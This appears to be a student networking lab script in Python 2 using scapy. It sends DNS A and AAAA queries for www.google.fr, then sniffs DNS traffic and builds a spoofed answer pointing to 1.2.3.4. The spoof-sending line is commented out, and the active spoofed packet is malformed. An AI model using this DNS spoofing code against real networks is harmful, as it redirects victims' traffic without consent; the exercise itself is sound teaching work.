#!/usr/bin/python
# albert_k - APING_I3 2018 
# python 2.7

from scapy.all import *

conf.L3socket =L3RawSocket

dnsserv="8.8.8.8"
############### EXO 1 ################
def exo1():
    rep=sr1(IP(dst=dnsserv)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.google.fr.")),verbose=0)
    
    if rep[DNSQR].qtype == 1:
        type='A'


    
    #print rep[DNS].summary()
    print rep[DNSQR].qname[:-1], str(type), rep[DNSRR].rdata


############### EXO 2 ###############
def exo2():
    rep=sr1(IP(dst=dnsserv)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.google.fr.",qtype="AAAA")),verbose=0)
    
    if rep[DNSQR].qtype == 28:
        type='AAAA'


    
    #print rep[DNS].summary()
    print rep[DNSQR].qname[:-1], str(type), rep[DNSRR].rdata


################ EXO 3 ###############
def callback(pkt):
    if DNS in pkt[0] and pkt[DNS].opcode == 0:
        if pkt[DNSQR].qtype == 1 and pkt[DNSQR].qname[:-1] == "www.google.fr":
             #spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
             #              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
             #              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
             #              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=42, rdata='1.2.3.4'))
            #requete type A + www.google.fr
            spoofed_pkt = IP(dst=pkt[IP].src, src='1.2.3.4', ttl=42)/DNS(opcode=1)/DNSRR(rdata="1.2.3.4")
            
            #send(spoofed_pkt)
            print pkt[DNSQR].qname, ' A? => ', spoofed_pkt[DNSRR].rdata






    

def test(packet):
    print packet[DNSQR].qname

def exo3():
    sniff(filter="port 53", count=0, prn=callback,timeout=None, iface='eth0')

    

exo1()
exo2()
exo3()


